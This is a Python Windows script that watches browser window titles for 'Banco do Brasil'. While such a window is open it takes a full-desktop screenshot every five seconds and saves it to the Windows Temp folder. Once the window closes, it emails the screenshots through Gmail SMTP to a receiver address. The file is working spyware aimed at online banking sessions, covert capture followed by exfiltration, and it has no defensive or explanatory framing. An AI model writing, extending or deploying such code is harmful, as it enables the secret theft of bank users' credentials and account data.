import win32gui
import win32ui
import win32con
import win32api
import time
import ctypes
import os
from enviaremail import *
from zipfile import ZipFile
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

awareness = ctypes.c_int()
ctypes.windll.shcore.SetProcessDpiAwareness(2)


index = 0
ongoing = False

def enumerationCallaback(hwnd, results):
    text = win32gui.GetWindowText(hwnd)
    if text.find("Google Chrome") >=0 or text.find("Mozilla Firefox") >= 0:
        results.append((hwnd, text))



# grab a handle to the main desktop window
hdesktop = win32gui.GetDesktopWindow()

# determine the size of all monitors in pixels

width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)



def screenLogger():


    global index
    index +=1

    # create a device context
    desktop_dc = win32gui.GetWindowDC(hdesktop)
    img_dc = win32ui.CreateDCFromHandle(desktop_dc)

    # create a memory based device context
    mem_dc = img_dc.CreateCompatibleDC()
    # create a bitmap object
    screenshot = win32ui.CreateBitmap()
    screenshot.CreateCompatibleBitmap(img_dc, width, height)
    
    mem_dc.SelectObject(screenshot)

    # copy the screen into our memory device context
    mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)

    # save the bitmap to a file
    screenshot.SaveBitmapFile(mem_dc, 'c:/WINDOWS/Temp/screenlog' + str(index)+'.bmp')

    # free our objects
    mem_dc.DeleteDC()
    win32gui.DeleteObject(screenshot.GetHandle())

def zipImgs():
    ziparq = ZipFile('c:/WINDOWS/Temp/screenlog.zip', 'w')
    for arq in os.listdir('c:/WINDOWS/Temp/'):
        if "screenlog" in arq:
            ziparq.write('c:/WINDOWS/Temp/'+arq, arq)


def enviarMail():
    
    mail_content = '''Hello,
    Screenlog results...
    '''
    message = MIMEMultipart()
    message['From'] = sender_address
    message['To'] = receiver_address
    message['Subject'] = 'Screenshots are attached'
 
    message.attach(MIMEText(mail_content, 'plain'))
    attach_file_name = 'c:/WINDOWS/Temp/screenlog.zip'
    attach_file = open(attach_file_name, 'rb') # Open the file as binary mode
    payload = MIMEBase('application', 'octate-stream')
    payload.set_payload((attach_file).read())
    encoders.encode_base64(payload) #encode the attachment
    #add payload header with filename
    payload.add_header('Content-Decomposition', 'attachment', filename=attach_file_name)
    message.attach(payload)
    #Create SMTP session for sending the mail
    session = smtplib.SMTP('smtp.gmail.com', 587) #use gmail with port
    session.starttls() #enable security
    session.login(sender_address, sender_pass) #login with mail_id and password
    text = message.as_string()
    session.sendmail(sender_address, receiver_address, text)
    session.quit()
    print('Mail Sent')



while True:
    
    logging = False
    time.sleep(5)
    mywindows = []    
    win32gui.EnumWindows(enumerationCallaback, mywindows)
    print(mywindows)
    for text in mywindows:
        if any("Banco do Brasil" in str(x) for x in text):
            logging = True
            ongoing = True
            break

    if ongoing == True and logging == False:
            ongoing = False
            #zipImgs()
            enviarMail()
            

    if logging == True:
        screenLogger()


